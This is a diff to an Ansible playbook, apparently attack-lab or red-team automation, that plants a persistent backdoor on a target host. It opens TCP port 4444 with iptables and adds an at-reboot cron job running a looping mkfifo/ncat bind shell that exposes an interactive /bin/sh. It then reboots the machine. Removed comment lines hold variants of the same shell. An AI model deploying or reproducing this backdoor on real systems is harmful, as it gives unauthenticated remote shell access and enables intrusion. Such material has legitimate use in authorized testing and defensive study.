@@ -1,21 +1,23 @@
 ---
 - hosts: "{{ host }}"
-  remote_user: root
+  remote_user: "{{ user }}"
 
-- name: Allow traffic on port 4444
-  ansible.builtin.import_playbook: ../common/allowTraffic.yml
-  vars:
-    port_no: "4444"
-    proto: tcp
+  tasks:
+  - name: Allow TCP traffic on 4444
+    ansible.builtin.iptables:
+      chain: INPUT
+      protocol: "tcp"
+      destination_ports:
+        - "4444"
+      jump: ACCEPT
 
-- name: Create netcat listener cron job
-  ansible.builtin.import_playbook: ../common/cronJob.yml
-  vars:
-    # job_cmd: "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|while true; do ncat -lnvp 4444 -e /bin/bash >/tmp/f; done"
-    #job_cmd: "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|ncat -lnvp 4444 >/tmp/f"
-    job_cmd: "while true; do rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|ncat -lnvp 4444 >/tmp/f; done"
+  - name: Create netcat listener cron job
+    ansible.builtin.cron:
+      name: "Cron job executed after every reboot"
+      special_time: reboot
+      job: "while true; do rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|ncat -lnvp 4444 >/tmp/f; done"
+      user: "{{ user }}"
 
-- name: Reboot machine
-  ansible.builtin.import_playbook: ../common/reboot.yml
-  vars:
-    timeout: 60
+  - name: Reboot machine
+    ansible.builtin.reboot:
+      reboot_timeout: "60"
